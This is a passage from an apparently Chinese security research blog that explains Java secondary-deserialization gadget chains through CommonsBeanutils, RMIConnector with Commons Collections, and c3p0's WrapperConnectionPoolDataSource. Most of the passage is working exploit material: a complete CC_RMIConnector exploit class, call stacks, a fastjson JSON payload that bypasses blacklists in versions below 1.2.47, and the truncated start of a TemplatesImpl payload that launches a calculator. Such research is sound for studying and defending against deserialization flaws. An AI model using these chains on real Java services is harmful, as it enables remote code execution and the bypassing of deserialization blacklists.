</span></span><span class="line"><span class="cl"><span class="nl">getProperty:</span><span class="mi">464</span><span class="o">,</span> <span class="n">PropertyUtils</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">compare:</span><span class="mi">163</span><span class="o">,</span> <span class="n">BeanComparator</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">beanutils</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">siftDownUsingComparator:</span><span class="mi">722</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">siftDown:</span><span class="mi">688</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">heapify:</span><span class="mi">737</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">797</span><span class="o">,</span> <span class="n">PriorityQueue</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invokeReadObject:</span><span class="mi">1170</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readSerialData:</span><span class="mi">2178</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readOrdinaryObject:</span><span class="mi">2069</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject0:</span><span class="mi">1573</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="小结">小结</h4>
<p>对于 rome 来说，二次反序列化多用于目标不出网的情况（当然也可以用于绕过黑名单）</p>
<p>而 CB 这条，唯一作用就是绕过黑名单了吧</p>
<p>这是正常的CB链</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810102847849.png"
    data-srcset="./Zets/index/image-20220810102847849.png, ./Zets/index/image-20220810102847849.png 1.5x, ./Zets/index/image-20220810102847849.png 2x"
    data-sizes="auto"
    alt="image-20220810102847849"
    title="image-20220810102847849"/></p>
<p>这是二次反序列化之后的</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810102933448.png"
    data-srcset="./Zets/index/image-20220810102933448.png, ./Zets/index/image-20220810102933448.png 1.5x, ./Zets/index/image-20220810102933448.png 2x"
    data-sizes="auto"
    alt="image-20220810102933448"
    title="image-20220810102933448"/></p>
<h3 id="rmiconnector">RMIConnector</h3>
<h4 id="原理-1">原理</h4>
<p>它，是<code>javax.management</code>下一个与远程 rmi 连接器的连接类，但却有自己的想法</p>
<p>关注它的<code>findRMIServerJRMP</code>方法</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810105313314.png"
    data-srcset="./Zets/index/image-20220810105313314.png, ./Zets/index/image-20220810105313314.png 1.5x, ./Zets/index/image-20220810105313314.png 2x"
    data-sizes="auto"
    alt="image-20220810105313314"
    title="image-20220810105313314"/></p>
<p>往上找，看到要求 path 以 /stub/ 开头</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810105450289.png"
    data-srcset="./Zets/index/image-20220810105450289.png, ./Zets/index/image-20220810105450289.png 1.5x, ./Zets/index/image-20220810105450289.png 2x"
    data-sizes="auto"
    alt="image-20220810105450289"
    title="image-20220810105450289"/></p>
<p>继续往上找，在该类的 public 方法<code>connect</code>中看到调用，要求 rmiServer 为 null</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810105824784.png"
    data-srcset="./Zets/index/image-20220810105824784.png, ./Zets/index/image-20220810105824784.png 1.5x, ./Zets/index/image-20220810105824784.png 2x"
    data-sizes="auto"
    alt="image-20220810105824784"
    title="image-20220810105824784"/></p>
<p>有一个绝佳的构造方法符合茯苓的要求</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810110134482.png"
    data-srcset="./Zets/index/image-20220810110134482.png, ./Zets/index/image-20220810110134482.png 1.5x, ./Zets/index/image-20220810110134482.png 2x"
    data-sizes="auto"
    alt="image-20220810110134482"
    title="image-20220810110134482"/></p>
<p>到此，这个利用方法就通了，给出构造</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">JMXServiceURL</span> <span class="n">jmxServiceURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">&#34;service:jmx:rmi://&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="s">&#34;urlPath&#34;</span><span class="o">,</span> <span class="s">&#34;/stub/base64string&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">RMIConnector</span> <span class="n">rmiConnector</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnector</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在只要能调用它的<code>connect</code>方法就可以了</p>
<h4 id="cc链">CC链</h4>
<p>说到调用任意方法，茯苓一下子就想到了 CC 链</p>
<h5 id="invokertransformer">InvokerTransformer</h5>
<p>将<code>connect</code>装入</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810111220880.png"
    data-srcset="./Zets/index/image-20220810111220880.png, ./Zets/index/image-20220810111220880.png 1.5x, ./Zets/index/image-20220810111220880.png 2x"
    data-sizes="auto"
    alt="image-20220810111220880"
    title="image-20220810111220880"/></p>
<p>用<code>TiedMapEntry</code>封装<code>LazyMap</code></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810111306848.png"
    data-srcset="./Zets/index/image-20220810111306848.png, ./Zets/index/image-20220810111306848.png 1.5x, ./Zets/index/image-20220810111306848.png 2x"
    data-sizes="auto"
    alt="image-20220810111306848"
    title="image-20220810111306848"/></p>
<p>最后装入<code>HashMap</code>用于触发整条链</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810111511145.png"
    data-srcset="./Zets/index/image-20220810111511145.png, ./Zets/index/image-20220810111511145.png 1.5x, ./Zets/index/image-20220810111511145.png 2x"
    data-sizes="auto"
    alt="image-20220810111511145"
    title="image-20220810111511145"/></p>
<p>完整 exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.management.remote.JMXServiceURL</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.management.remote.rmi.RMIConnector</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import static</span> <span class="nn">util.Tool.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC_RMIConnector</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">JMXServiceURL</span> <span class="n">jmxServiceURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">&#34;service:jmx:rmi://&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="s">&#34;urlPath&#34;</span><span class="o">,</span> <span class="s">&#34;/stub/base64string&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">RMIConnector</span> <span class="n">rmiConnector</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnector</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;connect&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span> <span class="n">rmiConnector</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">expMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">        <span class="n">expMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span> <span class="s">&#34;Poria&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">rmiConnector</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="s">&#34;factory&#34;</span><span class="o">,</span> <span class="n">invokerTransformer</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">run</span><span class="o">(</span><span class="n">expMap</span><span class="o">,</span> <span class="s">&#34;debug&#34;</span><span class="o">,</span> <span class="s">&#34;object&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>调用栈</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">424</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">findRMIServerJRMP:</span><span class="mi">2007</span><span class="o">,</span> <span class="n">RMIConnector</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">remote</span><span class="o">.</span><span class="na">rmi</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">findRMIServer:</span><span class="mi">1924</span><span class="o">,</span> <span class="n">RMIConnector</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">remote</span><span class="o">.</span><span class="na">rmi</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">connect:</span><span class="mi">287</span><span class="o">,</span> <span class="n">RMIConnector</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">remote</span><span class="o">.</span><span class="na">rmi</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">connect:</span><span class="mi">249</span><span class="o">,</span> <span class="n">RMIConnector</span> <span class="o">(</span><span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">remote</span><span class="o">.</span><span class="na">rmi</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">transform:</span><span class="mi">126</span><span class="o">,</span> <span class="n">InvokerTransformer</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">functors</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">get:</span><span class="mi">158</span><span class="o">,</span> <span class="n">LazyMap</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">map</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">getValue:</span><span class="mi">74</span><span class="o">,</span> <span class="n">TiedMapEntry</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">keyvalue</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">hashCode:</span><span class="mi">121</span><span class="o">,</span> <span class="n">TiedMapEntry</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">collections</span><span class="o">.</span><span class="na">keyvalue</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">hash:</span><span class="mi">339</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">1410</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">invokeReadObject:</span><span class="mi">1170</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readSerialData:</span><span class="mi">2178</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readOrdinaryObject:</span><span class="mi">2069</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject0:</span><span class="mi">1573</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="小结-1">小结</h4>
<p>这条链可以用于存在 CC 依赖但是有黑名单时候，说实话，茯苓觉得这个链很鸡肋，可能只能面对一些很极端的情况</p>
<h3 id="wrapperconnectionpooldatasource">WrapperConnectionPoolDataSource</h3>
<h4 id="原理-2">原理</h4>
<p>它，是<code>com.mchange.v2.c3p0</code>下的。。对不起编不下去了</p>
<p><code>WrapperConnectionPoolDataSource</code>继承于<code>WrapperConnectionPoolDataSourceBase</code>，在<code>WrapperConnectionPoolDataSourceBase</code>中存在属性<code>userOverridesAsString</code>及其<code>setter</code>方法<code>setUserOverridesAsString</code>，触发<code>fireVetoableChange</code>事件处理</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810143253198.png"
    data-srcset="./Zets/index/image-20220810143253198.png, ./Zets/index/image-20220810143253198.png 1.5x, ./Zets/index/image-20220810143253198.png 2x"
    data-sizes="auto"
    alt="image-20220810143253198"
    title="image-20220810143253198"/></p>
<p>其中有一个判断语句，当其属性为<code>userOverridesAsString</code>时，将调用<code>parseUserOverridesAsString</code>方法</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810143431243.png"
    data-srcset="./Zets/index/image-20220810143431243.png, ./Zets/index/image-20220810143431243.png 1.5x, ./Zets/index/image-20220810143431243.png 2x"
    data-sizes="auto"
    alt="image-20220810143431243"
    title="image-20220810143431243"/></p>
<p>截取<code>HexAsciiSerializedMap</code>之后的内容，进入到<code>fromByteArray</code></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810144104414.png"
    data-srcset="./Zets/index/image-20220810144104414.png, ./Zets/index/image-20220810144104414.png 1.5x, ./Zets/index/image-20220810144104414.png 2x"
    data-sizes="auto"
    alt="image-20220810144104414"
    title="image-20220810144104414"/></p>
<p>最后进入到<code>deserializeFromByteArray</code>中，进行二次反序列化</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="./Zets/index/image-20220810144223161.png"
    data-srcset="./Zets/index/image-20220810144223161.png, ./Zets/index/image-20220810144223161.png 1.5x, ./Zets/index/image-20220810144223161.png 2x"
    data-sizes="auto"
    alt="image-20220810144223161"
    title="image-20220810144223161"/></p>
<p>至此该链子就通了，构造起来呢，相信大家也都看出来了，可以利用 fastjson 来达成，在小于1.2.47的版本，使用缓存绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;rand1&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.Class&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;val&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;rand2&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;userOverridesAsString&#34;</span><span class="p">:</span> <span class="s2">&#34;HexAsciiSerializedMap:hexstring;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后那个封号不要忘记！</p>
<h4 id="c3p0_hex">C3P0_Hex</h4>
<p>这条链子就得看依赖了，有什么打什么，记得把序列化后的内容转化为16进制字符就可以了</p>
<p>茯苓这里给出 CBShiro 的例子（别问，问就是偏爱）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import static</span> <span class="nn">util.Tool.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Hex</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span><span class="o">(</span><span class="s">&#34;mate-calc&#34;</span><span class="o">).</span><span class="na">toBytecode</span><span class="o">()});</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;Poria&#34;</span><span class="o">);</span>
